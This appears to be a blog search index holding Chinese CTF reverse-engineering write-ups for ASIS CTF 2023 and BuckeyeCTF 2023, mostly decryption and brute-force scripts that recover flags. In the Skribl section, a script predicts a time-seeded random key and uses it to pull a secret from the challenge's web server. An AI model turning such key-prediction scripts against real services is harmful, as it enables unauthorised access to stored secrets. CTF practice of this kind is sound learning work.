<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ACTF flutter复现</title>
    <url>/2024/03/28/ACTF-flutter%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h6 id="RPEFACE：写一个flutter程序以后自己逆逆呗，一看刚好有个高版本flutter的题没复现"><a href="#RPEFACE：写一个flutter程序以后自己逆逆呗，一看刚好有个高版本flutter的题没复现" class="headerlink" title="RPEFACE：写一个flutter程序以后自己逆逆呗，一看刚好有个高版本flutter的题没复现~"></a>RPEFACE：写一个flutter程序以后自己逆逆呗，一看刚好有个高版本flutter的题没复现~</h6><span id="more"></span>
]]></content>
  </entry>
  <entry>
    <title>ASIS_CTF2023</title>
    <url>/2023/09/24/ASIS-CTF2023/</url>
    <content><![CDATA[<h6 id="PREFACE：赛中做了算三个吧，sid有点小变态，爆出来了，但是没找到flag，经别的师傅点醒才知道没有格式，反正么只是来看看题而已，作业好多还要上学…"><a href="#PREFACE：赛中做了算三个吧，sid有点小变态，爆出来了，但是没找到flag，经别的师傅点醒才知道没有格式，反正么只是来看看题而已，作业好多还要上学…" class="headerlink" title="PREFACE：赛中做了算三个吧，sid有点小变态，爆出来了，但是没找到flag，经别的师傅点醒才知道没有格式，反正么只是来看看题而已，作业好多还要上学…"></a>PREFACE：赛中做了算三个吧，sid有点小变态，爆出来了，但是没找到flag，经别的师傅点醒才知道没有格式，反正么只是来看看题而已，作业好多还要上学…</h6><h6 id="9-25-小补一个题，解数毕竟比sid多，虽然说题越做越多，能做的题确实越来越少了，高手题几乎完全没法碰…"><a href="#9-25-小补一个题，解数毕竟比sid多，虽然说题越做越多，能做的题确实越来越少了，高手题几乎完全没法碰…" class="headerlink" title="9-25: 小补一个题，解数毕竟比sid多，虽然说题越做越多，能做的题确实越来越少了，高手题几乎完全没法碰…"></a>9-25: 小补一个题，解数毕竟比sid多，虽然说题越做越多，能做的题确实越来越少了，高手题几乎完全没法碰…</h6><span id="more"></span>

<h3 id="grid"><a href="#grid" class="headerlink" title="grid"></a>grid</h3><p>warmup题，加密逻辑很简单，就是对着box反映射一下</p>
<pre><code class="python">box = [1, 118,   2,  44,   3,  59,   4,  69,   5, 189,
    6, 242,   7, 146,   8,  93,   9, 145,  10,  45,
   11,  46,  12, 127,  13, 233,  14,  60,  15, 120,
   16, 159,  17, 138,  18, 165,  19, 113,  20, 148,
   21,  63,  22, 167,  23, 219,  24, 232,  25, 246,
   26, 164,  27, 153,  28, 230,  29,  34,  30,  64,
   31, 255,  32, 220,  33, 238,  34, 234,  35,  36,
   36, 109,  37,  88,  38,   2,  39, 162,  40, 221,
   41, 134,  42, 158,  43, 161,  44, 225,  45,  25,
   46, 224,  47, 100,  48, 106,  49, 179,  50,  94,
   51,  43,  52, 187,  53,  56,  54,  79,  55,  48,
   56,  83,  57,  68,  58, 117,  59, 101,  60, 249,
   61,  75,  62, 193,  63,  35,  64, 178,  65, 190,
   66, 213,  67,   5,  68, 128,  69,  97,  70, 254,
   71,  96,  72, 227,  73,  50,  74, 133,  75, 244,
   76, 207,  77,  90,  78,  58,  79,  67,  80, 214,
   81, 111,  82,  84,  83, 185,  84, 204,  85, 245,
   86, 181,  87,  89,  88,  22,  89, 231,  90, 169,
   91, 174,  92, 241,  93,   8,  94,  62,  95, 125,
   96, 228,  97, 222,  98, 198,  99,  28, 100, 235,
  101, 182, 102, 151, 103,  21, 104,  81, 105, 124,
  106, 173, 107, 205, 108,  39, 109,  10, 110,  53,
  111,  95, 112, 212, 113,  19, 114, 160, 115,  20,
  116, 103, 117, 122, 118, 140, 119,  74, 120, 114,
  121,  47, 122, 218, 123, 239, 124,  73, 125,  14,
  126, 211, 127, 250, 128,  61, 129, 192, 130,  51,
  131, 102, 132, 170, 133, 206, 134, 252, 135, 176,
  136,  98, 137, 147, 138,  65, 139, 215, 140,  72,
  141, 191, 142, 202, 143, 200, 144,   3, 145, 126,
  146,  15, 147, 155, 148, 203, 149,  86, 150, 216,
  151, 121, 152,  82, 153, 163, 154, 171, 155, 104,
  156,  66, 157, 237, 158, 129, 159, 132, 160, 156,
  161,  16, 162,  91, 163,  11, 164,  26, 165, 112,
  166, 248, 167,  99, 168, 166, 169, 175, 170,  32,
  171, 152, 172,   1, 173,  52, 174,  41, 175, 226,
  176, 251, 177,  23, 178, 154, 179, 172, 180,   4,
  181,  92, 182,  54, 183, 186, 184, 217, 185, 177,
  186, 247, 187, 195, 188,  80, 189, 209, 190, 188,
  191, 229, 192, 144, 193,  37, 194,  12, 195, 136,
  196, 184, 197,  18, 198, 210, 199,  27, 200,  71,
  201,  77, 202, 196, 203,   7, 204,  30, 205, 135,
  206, 123, 207,  87, 208, 240, 209, 253, 210,  85,
  211,  29, 212, 105, 213, 223, 214, 108, 215,  42,
  216, 236, 217, 110, 218, 199, 219,  40, 220, 142,
  221, 194, 222, 130, 223, 157, 224,  78, 225,  24,
  226, 115, 227, 149, 228, 201, 229,  13, 230, 137,
  231, 141, 232, 107, 233, 139, 234,  70, 235,  17,
  236,  33, 237, 116, 238,  76, 239,   9, 240, 243,
  241, 197, 242, 208, 243, 131, 244, 183, 245,  31,
  246,  55, 247, 180, 248,  38, 249,   6, 250,  49,
  251, 150, 252,  57, 253, 168, 254, 119, 255, 143]
# enc = &#39;6A35BB7DA9EE7D387CE330EFB932B9BE0D4F50A54DE597DE738DE617D542BE3670EEEEE61443AB627CFBEE31C7DD4F5&#39;
enclist = [&#39;6A35BB7DA9EE7D387CE330EFB932B9BE&#39;,&#39;D4F50A54DE597DE738DE617D542BE367&#39;,&#39;0EEEEE61443AB627CFBEE31C7D&#39;] #这里需要删掉一点点
flag = &#39;&#39;
for enc in enclist:
    a = [int(enc[i:i + 2], 16) for i in range(0, len(enc), 2)]

    def create_mapping(lst):
        odd_numbers = []
        even_numbers = []
        mapping = &#123;&#125;
        for num in range(256):
            if num % 2 == 0:
                even_numbers.append(lst[num])
            else:
                odd_numbers.append(lst[num])
        for odd, even in zip(odd_numbers, even_numbers):
            mapping[odd] = even
        return mapping

    map = create_mapping(box)
    # print(map)
    tmpflag = &#39;&#39;
    for i in a:
       tmpflag += chr(map[i])
    tmpflag = tmpflag[::-1]
    flag += tmpflag
    print(tmpflag)
print()
print(flag)

# ASIS&#123;7Hi5_!Z_4n0tH3R_Ea5Y_WaRmUp_cHALleN9E!!&#125;
</code></pre>
<h3 id="buzz"><a href="#buzz" class="headerlink" title="buzz"></a>buzz</h3><p>对于flag的每一位加密，打印的BUZZ[]数量可以转化为数字，即加密后的数</p>
<p>ios的没设备没环境不能调，否则直接打印一张大映射表就行，只能硬逆，好在逻辑比较简单</p>
<p>但其实不好看，这个逻辑不知道怎么做的编译器优化，很抽象：</p>
<p><img src="/2023/09/24/ASIS-CTF2023/image-20230924085147175.png" alt="image-20230924085147175"></p>
<p>不过可以辨认出<code>xor</code> <code>shl</code> <code>*55</code> <code>+ 97</code> <code>+44</code> 等操作，其中<code>*55</code>这个会生成一个比较大的数，可以根据这个判断，发现是每七位一组循环加密</p>
<p>先提取<code>enc[]</code></p>
<pre><code class="python">def read_brackets_from_file(filename):
    bracket_count = 0
    result = []

    with open(filename, &#39;r&#39;) as f:
        while True:
            char = f.read(1)
            if not char:
                break

            if char == &#39;]&#39;:
                bracket_count += 1
            else:
                if bracket_count &gt; 0:
                    result.append(bracket_count)
                    bracket_count = 0
    if bracket_count &gt; 0:
        result.append(bracket_count)

    return result


filename = &quot;./flag.enc&quot;
result = read_brackets_from_file(filename)
print(result)

# 可以发现后续都是填充用的，不需要管
</code></pre>
<p>介于加密逻辑不能调确实静态看挺麻烦的，反正就猜猜测测拿到exp.py:</p>
<pre><code class="python">enc = [34, 99, 1168, 332, 6765, 197, 117, 5, 118, 784, 396, 6435, 205, 128, 60, 68, 832, 460, 5885, 192, 92, 5, 111, 1872, 312, 5500, 148, 158, 48, 68, 1040, 440, 5500, 130, 154, 90, 111, 1856, 288, 2805, 192, 117, 13, 126, 1616, 456, 5225, 216, 123, 17, 123, 1680, 440, 3905, 150, 139, 12, 118, 1520, 392, 2695, 207, 141, 49, 73, 528, 500, 550]
print(len(enc))
for i in range(len(enc)):
    if ((i + 1) % 7 == 1):
        enc[i] ^= ord(&#39;A&#39;) ^ 34

    if ((i + 1) % 7 == 2):
        enc[i] ^= 0x30

    if ((i + 1) % 7 == 3):
        enc[i] //= 16

    if ((i + 1) % 7 == 4):
        enc[i] //= 4

    if ((i + 1) % 7 == 5):
        enc[i] //= 55

    if ((i + 1) % 7 == 6):
        enc[i] -= 97

    if ((i + 1) % 7 == 0):
        enc[i] -= 44

for i in enc:
    print(chr(i),end=&#39;&#39;)
print()

# ASIS&#123;dIfF1culT_t4sk_0f_uNd3rStAnd!n9_tH3_InNer_wOrKinG5_oF_b1naRy!&#125;
</code></pre>
<h3 id="sid"><a href="#sid" class="headerlink" title="sid"></a>sid</h3><p>cpp玩意跟混淆了一样…真的难顶</p>
<p><img src="/2023/09/24/ASIS-CTF2023/image-20230924085847189.png" alt="image-20230924085847189"></p>
<p>不过其实也就用了点<code>stl string</code>多做点可以猜猜</p>
<p>坏了，现在复盘的时候发现了，前面已经截掉<code>ASIS&#123;</code>了，昨天爆破的头晕眼花了把这事给忘了…</p>
<p><img src="/2023/09/24/ASIS-CTF2023/image-20230924085932475.png" alt="image-20230924085932475"></p>
<p>有些大数操作看起来是编译器优化的产物，动调过去就知道没啥用了</p>
<p>主要加密逻辑（已经手动写了符号）：</p>
<p><img src="/2023/09/24/ASIS-CTF2023/image-20230924090138635.png" alt="image-20230924090138635"></p>
<p>其中比较难逆的就是<code>string_append_and_some_kind_of_enc</code>这个玩意（低水平起名）</p>
<p>里面都是很看不懂的大数操作和string操作</p>
<p><img src="/2023/09/24/ASIS-CTF2023/image-20230924090248263.png" alt="image-20230924090248263"></p>
<p>不过进来就可以看到特征数了</p>
<p><img src="/2023/09/24/ASIS-CTF2023/image-20230924090324244.png" alt="image-20230924090324244"></p>
<p>注意这里还做了魔改，这个some_enc看起来就是流加密<code>chacha20</code>或者<code>salsa20</code>的流密钥初始化，但是他下面还加了异或随机数</p>
<p><img src="/2023/09/24/ASIS-CTF2023/image-20230924090624372.png" alt="image-20230924090624372"></p>
<p>分别写chacha20脚本和salsa脚本测试一下：</p>
<pre><code class="python">from Crypto.Cipher import ChaCha20
# chacha20
key = b&#39;\x07\x05\x0B\x0D\x0F\x0D\x0B\x05\x07\x05\x1B\x1D\x1F\x1D\x1B\x05\x07\x05\x0B\x0D\x0F\x37\x35\x3B\x3D\x3F\x07\x05\x0B\x0D\x0F\x0D&#39;
plaintext = b&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_&quot;
nonce = b&#39;\x00\x00\x00\x00\x00\x00\x00\x00&#39;
cipher = ChaCha20.new(key=key,nonce=nonce)
ciphertext = cipher.encrypt(plaintext)

# 获取 nonce（用于解密）
# nonce = cipher.nonce


# 解密
# cipher = ChaCha20.new(key=key, nonce=nonce)
# decrypted_text = cipher.decrypt(ciphertext)

a = [hex(i) for i in ciphertext]
print(a)
b = [    0x20, 0xFD, 0x17, 0xA2, 0x34, 0x4E, 0x3C, 0x87, 0x80, 0x06,
  0x77, 0x53, 0x27, 0x13, 0x73, 0x9E, 0xFA, 0x61, 0x75, 0x1D,
  0x49, 0xDB, 0x27, 0x5D, 0xEC, 0x63, 0xD4, 0x09, 0x1C, 0x4C,
  0x7E, 0x83, 0xC5, 0x63, 0xA3, 0xD9, 0x47, 0x6B, 0xFB, 0x65,
  0x40, 0x6B, 0xF5, 0x5F, 0x9C, 0xCF, 0x49, 0x17, 0x6C, 0xE8,
  0x99, 0xEF, 0xC3, 0xED, 0x95, 0x75, 0xAF, 0x70, 0x4D, 0x70,
  0x47, 0xD1, 0x36, 0x00]
for i in range(32):
    print(hex(int(a[i],16) ^ b[i]),end=&#39; &#39;)
</code></pre>
<pre><code class="python">from Crypto.Cipher import Salsa20

# Salsa20
key = b&#39;\x07\x05\x0B\x0D\x0F\x0D\x0B\x05\x07\x05\x1B\x1D\x1F\x1D\x1B\x05\x07\x05\x0B\x0D\x0F\x37\x35\x3B\x3D\x3F\x07\x05\x0B\x0D\x0F\x0D&#39;
nonce = b&#39;\x00\x00\x00\x00\x00\x00\x00\x00&#39;

plaintext = b&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_&quot;
cipher = Salsa20.new(key=key , nonce=nonce)
ciphertext = cipher.encrypt(plaintext)


a = [hex(i) for i in ciphertext]
print(a)
b = [  0xFA, 0xCD, 0xCD, 0x92, 0xEE, 0x7E, 0xE6, 0xB7, 0x5A, 0x36,
  0xAD, 0x63, 0xFD, 0x23, 0xA9, 0xAE, 0x20, 0x51, 0xAF, 0x2D,
  0x93, 0xEB, 0xFD, 0x6D, 0x36, 0x53, 0x0E, 0x39, 0xC6, 0x7C,
  0xA4, 0xB3, 0xC5, 0x63, 0xA3, 0xD9, 0x47, 0x6B, 0xFB, 0x65,
  0x40, 0x6B, 0xF5, 0x5F, 0x9C, 0xCF, 0x49, 0x17, 0x6C, 0xE8,
  0x99, 0xEF, 0xC3, 0xED, 0x95, 0x75, 0xAF, 0x70, 0x4D, 0x70,
  0x47, 0xD1, 0x36, 0x00]
for i in range(32):
    print(hex(int(a[i],16) ^ b[i]),end=&#39; &#39;)
</code></pre>
<p>发现<code>chacha20</code>得到的是2个*16组的随机数，故而确定这里是<code>chacha20+随机数</code>的流加密魔改</p>
<p>除此之外，还有几个<code>xor</code>操作，比较好逆，结合看一下最后的输出，就有整个流程：</p>
<pre><code>输入32位的flag和若干位的pass（32位）

flag = flag ^ pass

tmp = chacha20(key = flag, plaintext = pass, nonce = b&#39;\x00\x00\x00\x00\x00\x00\x00\x00&#39;)

cybertext1 = flag ^ random1 # random2也是两个随机数重复16次

cybertext2 = tmp ^ random2 # random1是两个随机数重复16次

output = hex_dump(cybertext1 + cybertext2)
</code></pre>
<p>解密时需要爆破四个随机数…0xff ^ 4的解空间，这里用的是python硬爆，需要12小时</p>
<p><img src="/2023/09/24/ASIS-CTF2023/image-20230924091010562.png" alt="image-20230924091010562"></p>
<p>毕竟不是冲分比赛，如果是的话可以到此找台队里好的电脑或者服务开爆（×）</p>
<p>不过自己做可以想想优化，可以看到<code>pass</code>全程都是被流加密的，原理上只做了单位异或</p>
<p>也就是说可以少爆一个random值，爆破两次，分别拿到flag的奇偶位，这样就是 <code>0xff ^ 3 * 2</code>的解空间，而<code>0xff ^ 3</code>大概是四分钟左右</p>
<p><img src="/2023/09/24/ASIS-CTF2023/image-20230924091433563.png" alt="image-20230924091433563">再做一点细微优化，可以缩减到两分半钟每次，那么总的单次爆破时间就缩减到了六分钟，调试和debug变得基本可行（本身流程比较复杂确实也没有一次写对，犯低级错误浪费时间了)</p>
<p><img src="/2023/09/24/ASIS-CTF2023/image-20230924091828715.png" alt="image-20230924091828715"></p>
<p>然后大概优化一下判断匹配标准，并且把奇偶位拼接上，基本上就是最后脚本了（个人还是觉得这里的一步步想法推进挺有意思的，就是debug过程很痛苦，每调一次就得在一堆乱七八糟的玩意里找乱七八糟的flag，这里把ASIS{的标志位留下来感觉体验会好很多…）</p>
<pre><code class="python">cybertext1 = &#39;e5be2ec5c9d2c1532abbbd7a907217a2fd078f46b102817d062124b0b02a5de9&#39;
cybertext2 = &#39;dcc3955c839144d7115f093c7fc198107779920a2c1b6ba2ae44b372849e6187&#39;

cybertext1_ori = [int(cybertext1[i:i+2], 16) for i in range(0, len(cybertext1), 2)]
cybertext2_ori = [int(cybertext2[i:i+2], 16) for i in range(0, len(cybertext2), 2)]

cybertext1 = [int(cybertext1[i:i+2], 16) for i in range(0, len(cybertext1), 2)]
cybertext2 = [int(cybertext2[i:i+2], 16) for i in range(0, len(cybertext2), 2)]

print(cybertext1)
print(cybertext2)

from Crypto.Cipher import ChaCha20
from tqdm import tqdm
total_iterations = (0xff+1) * (0xff+1) * (0xff+1)

flag_list_odd = []
flag_list_even = []
flag_list = []

with open(&#39;./forceOdd.bin&#39;,&#39;ab&#39;) as file:
    with tqdm(total=total_iterations) as pbar:
        for random1_1 in range(0, 1):
            for random1_2 in range(0, 0xff + 1):
                for i in range(len(cybertext1)):
                    if (i % 2 == 0):
                        cybertext1[i] = cybertext1_ori[i] ^ random1_1
                    else:
                        cybertext1[i] = cybertext1_ori[i] ^ random1_2

                for random2_1 in range(0, 0xff + 1):
                    for random2_2 in range(0, 0xff + 1):

                        for i in range(len(cybertext2)):
                            if (i % 2 == 0):
                                cybertext2[i] = cybertext2_ori[i] ^ random2_1
                            else :
                                cybertext2[i] = cybertext2_ori[i] ^ random2_2

                        key = bytes(cybertext2)
                        cybertext = bytes(cybertext1)
                        nonce = b&#39;\x00\x00\x00\x00\x00\x00\x00\x00&#39;
                        cipher = ChaCha20.new(key=key, nonce=nonce)
                        plain = cipher.encrypt(cybertext)
                        plain = bytes([x ^ y for x, y in zip(plain, key)])
                        if all(33 &lt;= int(plain[i]) &lt;= 126 for i in range(1, len(plain), 2)):
                            modified_plain = bytearray([plain[i] for i in range(1, len(plain), 2)])  # 创建一个可变的字节数组
                            file.write(bytes(modified_plain) + b&#39;\n&#39;)
                            flag_list_odd.append(bytes(modified_plain) + b&#39;\n&#39;)
                        pbar.update(1)

with open(&#39;./forceEven.bin&#39;, &#39;ab&#39;) as file:
    with tqdm(total=total_iterations) as pbar:
        for random1_1 in range(0, 0xff + 1):
            for random1_2 in range(0, 1):
                for i in range(len(cybertext1)):
                    if (i % 2 == 0):
                        cybertext1[i] = cybertext1_ori[i] ^ random1_1
                    else:
                        cybertext1[i] = cybertext1_ori[i] ^ random1_2

                for random2_1 in range(0, 0xff + 1):
                    for random2_2 in range(0, 0xff + 1):

                        for i in range(len(cybertext2)):
                            if (i % 2 == 0):
                                cybertext2[i] = cybertext2_ori[i] ^ random2_1
                            else :
                                cybertext2[i] = cybertext2_ori[i] ^ random2_2

                        key = bytes(cybertext2)
                        cybertext = bytes(cybertext1)
                        nonce = b&#39;\x00\x00\x00\x00\x00\x00\x00\x00&#39;
                        cipher = ChaCha20.new(key=key, nonce=nonce)
                        plain = cipher.encrypt(cybertext)
                        plain = bytes([x ^ y for x, y in zip(plain, key)])
                        if all(33 &lt;= int(plain[i]) &lt;= 126 for i in range(0, len(plain), 2)):
                            modified_plain = bytearray([plain[i] for i in range(0, len(plain), 2)])
                            file.write(bytes(modified_plain) + b&#39;\n&#39;)
                            flag_list_even.append(bytes(modified_plain) + b&#39;\n&#39;)
                        pbar.update(1)


for odd in flag_list_odd:
    for even in flag_list_even:
        tmp_flag = &#39;&#39;
        for i, j in zip(odd, even):
            tmp_flag += chr(j)
            tmp_flag += chr(i)
        flag_list.append(tmp_flag)
print(flag_list)
</code></pre>
<p>这里最后的版本需要肉眼在六百多条里面找真flag，应该算目前我能想的最优的爆破了，大概效果如下（还是相当精神污染的，可能是自己题做少了也说不准…）：</p>
<p><img src="/2023/09/24/ASIS-CTF2023/image-20230924092335126.png" alt="image-20230924092335126"></p>
<p>（后话：结果是python本身Crypto库的瓶颈，导致需要这样优化，其他师傅自己cpp写的满0xff ^ 4空间的爆破也就十几分钟左右，同样空间下python就得十几个小时了…）</p>
<h3 id="scrat"><a href="#scrat" class="headerlink" title="scrat"></a>scrat</h3><p>这个题其实和sid差不多，也是麻烦的加密和爆破（解数比sid多的原因完全可能是很多师傅和我一开始一样sid爆出来了但是没看见flag）</p>
<p>yysy，算是练习调试、<code>cpp string</code>导致的一些奇怪的汇编代码、猜测能力吧，新东西确实没有啥了</p>
<p>几处加密：</p>
<p><img src="/2023/09/24/ASIS-CTF2023/image-20230925191134745.png" alt="image-20230925191134745"></p>
<p><img src="/2023/09/24/ASIS-CTF2023/image-20230925191920010.png" alt="image-20230925191920010"></p>
<p><img src="/2023/09/24/ASIS-CTF2023/image-20230925191831529.png" alt="image-20230925191831529"></p>
<p>流程：</p>
<pre><code class="python">tmp = flag[i] * (39 + 1 - i)
s = sum(flag)
s = (s + (-1) ^ (i) * tmp) % 0x4141a15b
s = s * 39 % 0x4141a15b
seed = 1
v33 = 2

while s != 0:
    if s &amp; 1 != 0:
        seed = v33 * seed % 0x4141A15B
    v33 = v33 * v33 % 0x4141A15B
    s &gt;&gt;= 1

for i in range(39):
    seed = seed * 166013 + 4148159
    flag[i] ^= (seed // 0x10000) &amp; 0xff
</code></pre>
<p>exp.py (比赛结束了抄个JANlittle师傅的，感觉基本功确实还缺点qaq)</p>
<pre><code class="python">enc = bytes.fromhex(&#39;3a392465ffefc6b485193c32cefdb99df95cb6d6566478a17873b92b2df5dea31e5c0edbb1cc9b&#39;)

for s in range(5000000):
    seed = 1
    v33 = 2
    while s != 0:
        if s &amp; 1 != 0:
            seed = v33 * seed % 0x4141A15B
        v33 = v33 * v33 % 0x4141A15B
        s &gt;&gt;= 1

    t = list(enc)
    for i in range(39):
        seed = seed * 166013 + 4148159
        t[i] ^= (seed // 0x10000) &amp; 0xff
        if i == 3 and not bytes(t).startswith(b&#39;ASIS&#39;):
            break

    if bytes(t).startswith(b&#39;ASIS&#39;):
        print(bytes(t))

# ASIS&#123;___A_9!Rl_w1Th_Dr4G0N_7AtTO5___!!&#125;
</code></pre>
]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>BuckeyeCTF2023</title>
    <url>/2023/10/02/BuckeyeCTF2023/</url>
    <content><![CDATA[<h6 id="PREFACE-和maple一个时间段的比赛，似乎是大学新生赛…感觉-比maple难呢…"><a href="#PREFACE-和maple一个时间段的比赛，似乎是大学新生赛…感觉-比maple难呢…" class="headerlink" title="PREFACE: 和maple一个时间段的比赛，似乎是大学新生赛…感觉 比maple难呢…"></a>PREFACE: 和maple一个时间段的比赛，似乎是大学新生赛…感觉 比maple难呢…</h6><h6 id="或者换一种说法…怎么大学新生赛都喜欢搞抽象呢…"><a href="#或者换一种说法…怎么大学新生赛都喜欢搞抽象呢…" class="headerlink" title="或者换一种说法…怎么大学新生赛都喜欢搞抽象呢…"></a>或者换一种说法…怎么大学新生赛都喜欢搞抽象呢…</h6><span id="more"></span>

<h3 id="8ball"><a href="#8ball" class="headerlink" title="8ball"></a>8ball</h3><p>直接动调把前面全nop掉拿就行：<code>bctf&#123;Aw_$hucK$_Y0ur3_m@k1Ng_m3_bLu$h&#125;</code></p>
<h3 id="Converter"><a href="#Converter" class="headerlink" title="Converter"></a>Converter</h3><p>就在里面：<code>bctf&#123;o0ps_y0u_fOuNd_mE&#125;</code></p>
<h3 id="Emotional-Damage"><a href="#Emotional-Damage" class="headerlink" title="Emotional_Damage"></a>Emotional_Damage</h3><p>确实给我damage了，总归就是猜emoji代表的符号然后恢复流程逆flag，大部分可以gpt一把梭</p>
<h3 id="Skribl"><a href="#Skribl" class="headerlink" title="Skribl"></a>Skribl</h3><p>需要配置docker环境把python313环境搞出来，拿到backend字节码</p>
<pre><code class="python"># backend.pyc

 0           0 RESUME                   0

  1           2 LOAD_CONST               0 (0)
              4 LOAD_CONST               1 (None)
              6 IMPORT_NAME              0 (string)
              8 STORE_NAME               0 (string)

  2          10 LOAD_CONST               0 (0)
             12 LOAD_CONST               1 (None)
             14 IMPORT_NAME              1 (random)
             16 STORE_NAME               1 (random)

  3          18 LOAD_CONST               0 (0)
             20 LOAD_CONST               1 (None)
             22 IMPORT_NAME              2 (time)
             24 STORE_NAME               2 (time)

  4          26 LOAD_CONST               0 (0)
             28 LOAD_CONST               1 (None)
             30 IMPORT_NAME              3 (math)
             32 STORE_NAME               3 (math)

  5          34 LOAD_CONST               0 (0)
             36 LOAD_CONST               1 (None)
             38 IMPORT_NAME              4 (os)
             40 STORE_NAME               4 (os)

  8          42 LOAD_CONST               2 (&#39;return&#39;)
             44 LOAD_NAME                5 (str)
             46 BUILD_TUPLE              2
             48 LOAD_CONST               3 (&lt;code object create_skribl at 0x7f763b846970, file &quot;/home/rene/Documents/Java/OSUCyberSecurityClub/buckeyectf23/buckeyectf-challenges/chals/rev-pycache/dist/chal/backend.py&quot;, line 8&gt;)
             50 MAKE_FUNCTION
             52 SET_FUNCTION_ATTRIBUTE   4 (annotations)
             54 STORE_NAME               6 (create_skribl)

 18          56 LOAD_CONST               4 (&lt;code object init_backend at 0x7f763b734670, file &quot;/home/rene/Documents/Java/OSUCyberSecurityClub/buckeyectf23/buckeyectf-challenges/chals/rev-pycache/dist/chal/backend.py&quot;, line 18&gt;)
             58 MAKE_FUNCTION
             60 STORE_NAME               7 (init_backend)
             62 RETURN_CONST             1 (None)

Disassembly of &lt;code object create_skribl at 0x7f763b846970, file &quot;/home/rene/Documents/Java/OSUCyberSecurityClub/buckeyectf23/buckeyectf-challenges/chals/rev-pycache/dist/chal/backend.py&quot;, line 8&gt;:
   8           0 RESUME                   0

   9           2 LOAD_GLOBAL              1 (print + NULL)
              12 LOAD_CONST               1 (&#39;Creating skribl &#39;)
              14 LOAD_FAST                1 (message)
              16 FORMAT_SIMPLE
              18 BUILD_STRING             2
              20 CALL                     1
              28 POP_TOP

  11          30 LOAD_GLOBAL              2 (string)
              40 LOAD_ATTR                4 (ascii_lowercase)
              60 LOAD_GLOBAL              2 (string)
              70 LOAD_ATTR                6 (ascii_uppercase)
              90 BINARY_OP                0 (+)
              94 LOAD_GLOBAL              2 (string)
             104 LOAD_ATTR                8 (digits)
             124 BINARY_OP                0 (+)
             128 STORE_FAST               3 (alphabet)

  12         130 LOAD_GLOBAL             11 (range + NULL)
             140 LOAD_CONST               2 (40)
             142 CALL                     1
             150 GET_ITER
             152 LOAD_FAST_AND_CLEAR      4 (i)
             154 SWAP                     2
             156 BUILD_LIST               0
             158 SWAP                     2
         &gt;&gt;  160 FOR_ITER                25 (to 214)
             164 STORE_FAST               4 (i)
             166 LOAD_GLOBAL             12 (random)
             176 LOAD_ATTR               14 (choice)
             196 PUSH_NULL
             198 LOAD_FAST                3 (alphabet)
             200 CALL                     1
             208 LIST_APPEND              2
             210 JUMP_BACKWARD           27 (to 160)
         &gt;&gt;  214 END_FOR
             216 STORE_FAST               5 (key_list)
             218 STORE_FAST               4 (i)

  14         220 LOAD_CONST               3 (&#39;&#39;)
             222 LOAD_ATTR               17 (join + NULL|self)
             242 LOAD_FAST                5 (key_list)
             244 CALL                     1
             252 STORE_FAST               6 (key)

  15         254 LOAD_FAST_LOAD_FAST     18 (message, author)
             256 BUILD_TUPLE              2
             258 LOAD_FAST_LOAD_FAST      6 (skribls, key)
             260 STORE_SUBSCR

  16         264 LOAD_FAST                6 (key)
             266 RETURN_VALUE

None     &gt;&gt;  268 SWAP                     2
             270 POP_TOP

  12         272 SWAP                     2
             274 STORE_FAST               4 (i)
             276 RERAISE                  0
ExceptionTable:
  156 to 214 -&gt; 268 [2]

Disassembly of &lt;code object init_backend at 0x7f763b734670, file &quot;/home/rene/Documents/Java/OSUCyberSecurityClub/buckeyectf23/buckeyectf-challenges/chals/rev-pycache/dist/chal/backend.py&quot;, line 18&gt;:
 18           0 RESUME                   0

 19           2 LOAD_GLOBAL              0 (random)
             12 LOAD_ATTR                2 (seed)
             32 PUSH_NULL
             34 LOAD_GLOBAL              4 (math)
             44 LOAD_ATTR                6 (floor)
             64 PUSH_NULL
             66 LOAD_GLOBAL              8 (time)
             76 LOAD_ATTR                8 (time)
             96 PUSH_NULL
             98 CALL                     0
            106 CALL                     1
            114 CALL                     1
            122 POP_TOP

 21         124 LOAD_GLOBAL             11 (create_skribl + NULL)
            134 LOAD_FAST                0 (skribls)
            136 LOAD_GLOBAL             12 (os)
            146 LOAD_ATTR               14 (environ)
            166 LOAD_CONST               1 (&#39;FLAG&#39;)
            168 BINARY_SUBSCR
            172 LOAD_CONST               2 (&#39;rene&#39;)
            174 CALL                     3
            182 POP_TOP
            184 RETURN_CONST             0 (None)
</code></pre>
<p>这里的字节码简单手动反编译一下</p>
<pre><code class="python">import string
import random
import time
import math
import os

def create_skribl(skribls, message, author) -&gt; str:
    print (f&#39;Creating skribl &#123;message&#125;&#39;)
    alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits
    key_list = [random.choice(alphabet) for i in range(40)]
    key = &#39;&#39;.join(key_list)
    skribls[key] = (message, author)
    return key

def init_backend(skribls):
    random.seed(math.floor(time.time()))
    create_skribl(skribls, os.environ[&#39;FLAG&#39;], &#39;rene&#39;)
</code></pre>
<p>结合前面的代码，可以看到生成的四十个随机串有一个seed，是可以获取的（当前时间 - 网页持续时间，可以拿到这个环境的创建时间，flag是环境创建后立刻从环境变量中提取并写入的，所以可以直接获得key）</p>
<p>使用key访问view api即可</p>
<pre><code class="python">import string
import random
import time
import math
import os
import re
import requests
a = re.findall(&quot;duration\((\d+)&quot;,requests.get(&quot;https://skribl.chall.pwnoh.io/&quot;).text)
b = math.floor(time.time())
random.seed(math.floor(int(a[0]) - b))
alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits
key_list = [random.choice(alphabet) for i in range(40)]
key = &#39;&#39;.join(key_list)
url = &#39;https://skribl.chall.pwnoh.io/view/&#39; + key
response = requests.get(url)
lines = response.text.split(&#39;\n&#39;)
for line in lines:
        if &#39;bctf&#123;&#39; in line:
            print(line)
            break

#         &lt;p&gt;bctf&#123;wHy_d0_w3_Ne3d_s0_m@ny_N0T3$_aNyW@y&#125;&lt;/p&gt;
</code></pre>
]]></content>
  </entry>
  <entry>
    <title>CVE-2017-6736</title>
    <url>/2024/01/24/CVE-2017-6736/</url>
    <content><![CDATA[<h6 id="PREFACE：偷点纯真的理解"><a href="#PREFACE：偷点纯真的理解" class="headerlink" title="PREFACE：偷点纯真的理解"></a>PREFACE：偷点纯真的理解</h6><span id="more"></span>

